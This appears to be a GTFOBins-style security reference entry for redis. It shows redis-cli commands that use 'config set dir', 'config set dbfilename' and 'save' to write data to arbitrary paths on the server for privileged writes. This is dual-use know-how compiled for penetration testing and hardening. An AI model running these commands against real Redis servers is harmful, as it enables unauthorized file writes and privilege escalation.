# GTFOBin: redis

This works with versions lower than 7.

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

Write files on the server running Redis at the specified location. Written data will appear amongst the database dump, thus it might not be suitable for all kind of purposes.

```
IP=127.0.0.1
redis-cli -h $IP
config set dir dir_to_write_to
config set dbfilename file_to_write
set x "DATA"
save
```